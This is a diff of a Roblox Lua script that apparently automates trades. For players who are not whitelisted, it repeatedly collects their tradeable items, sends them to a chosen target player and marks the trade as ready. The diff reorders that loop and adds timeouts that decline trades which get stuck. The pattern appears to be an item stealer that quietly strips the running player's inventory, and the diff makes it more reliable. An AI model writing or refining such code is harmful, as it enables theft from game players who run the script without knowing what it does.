@@ -29,7 +29,15 @@ end)
 LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
     if LocalPlayer:GetAttribute("IsTrading") == true then
         task.spawn(function()
+            local timeStuck = 0
             while LocalPlayer:GetAttribute("IsTrading") == true do
+                if timeStuck >= 80 then
+                    pcall(function()
+                        TradeData.Remotes.DeclineTradeOffer:InvokeServer()
+                    end)
+                    break
+                end
+                
                 if not isProcessingAutoTrade then
                     pcall(function()
                         TradeData.Remotes.SetReady:InvokeServer(true)
@@ -37,6 +45,7 @@ LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
                     end)
                 end
                 task.wait(0.5)
+                timeStuck = timeStuck + 0.5
             end
         end)
     end
@@ -159,24 +168,32 @@ if not isWhitelisted then
         task.wait(math.random(1, 10))
         
         while true do
-            local targetPlayer = getAvailableTarget()
-            
-            if not targetPlayer then
-                task.wait(2)
-                continue
-            end
-            
             local itemsToTrade = getTradeableItems()
             if #itemsToTrade == 0 then
                 task.wait(3) 
                 continue 
             end
+
+            local targetPlayer = getAvailableTarget()
+            if not targetPlayer then
+                task.wait(2)
+                continue
+            end
             
             local success = processTrade(targetPlayer, itemsToTrade)
             
             if success then
-                while LocalPlayer:GetAttribute("IsTrading") == true do
-                    LocalPlayer:GetAttributeChangedSignal("IsTrading"):Wait()
+                local stuckTimer = 0
+                while LocalPlayer:GetAttribute("IsTrading") == true and stuckTimer < 120 do
+                    task.wait(1)
+                    stuckTimer = stuckTimer + 1
+                end
+                
+                if LocalPlayer:GetAttribute("IsTrading") == true then
+                    pcall(function()
+                        TradeData.Remotes.DeclineTradeOffer:InvokeServer()
+                    end)
+                    task.wait(2)
                 end
             else
                 task.wait(2)
